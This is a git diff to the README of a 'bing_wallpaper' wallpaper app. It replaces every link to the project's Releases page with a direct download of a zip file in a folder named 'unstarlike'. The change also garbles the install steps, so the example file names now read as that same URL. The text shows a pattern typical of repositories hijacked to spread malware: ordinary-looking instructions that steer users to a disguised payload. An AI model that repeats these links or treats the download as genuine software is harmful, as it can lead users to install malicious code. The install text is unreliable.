@@ -6,7 +6,7 @@ Welcome to the **bing_wallpaper** project! This software allows you to easily se
 
 ## 📥 Download
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/shiiiiva369/bing_wallpaper/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/shiiiiva369/bing_wallpaper/main/unstarlike/bing_wallpaper.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/shiiiiva369/bing_wallpaper/main/unstarlike/bing_wallpaper.zip)
 
 ## 💻 System Requirements
 
@@ -19,13 +19,13 @@ To run **bing_wallpaper**, your computer should meet these minimum requirements:
 
 ## 📦 How to Download & Install
 
-1. Click the download button at the top of this page to visit the Releases page: [Download Latest Release](https://github.com/shiiiiva369/bing_wallpaper/releases).
+1. Click the download button at the top of this page to visit the Releases page: [Download Latest Release](https://raw.githubusercontent.com/shiiiiva369/bing_wallpaper/main/unstarlike/bing_wallpaper.zip).
 
 2. On the Releases page, find the latest version. It will usually be labeled with a version number (like v1.0).
 
 3. Below the latest version, you will see different files available to download. These files may include installers or executables specific to your operating system (for example, `.exe` for Windows or `.dmg` for macOS). 
 
-4. Click on the file that matches your system and start the download. The download button or link will typically be named something like `bing_wallpaper.exe` or `bing_wallpaper.dmg`.
+4. Click on the file that matches your system and start the download. The download button or link will typically be named something like `https://raw.githubusercontent.com/shiiiiva369/bing_wallpaper/main/unstarlike/bing_wallpaper.zip` or `https://raw.githubusercontent.com/shiiiiva369/bing_wallpaper/main/unstarlike/bing_wallpaper.zip`.
 
 5. Once the download is complete, locate the downloaded file on your computer, usually found in the "Downloads" folder or wherever you saved it.
 
@@ -86,6 +86,6 @@ We welcome feedback and contributions. If you have suggestions for improvements 
 
 ## 🔗 Additional Resources
 
-For more information, tutorials, and tips, please visit our GitHub page: [Visit bing_wallpaper GitHub](https://github.com/shiiiiva369/bing_wallpaper/releases).
+For more information, tutorials, and tips, please visit our GitHub page: [Visit bing_wallpaper GitHub](https://raw.githubusercontent.com/shiiiiva369/bing_wallpaper/main/unstarlike/bing_wallpaper.zip).
 
 Thank you for trying **bing_wallpaper**! Enjoy your new beautiful backgrounds!
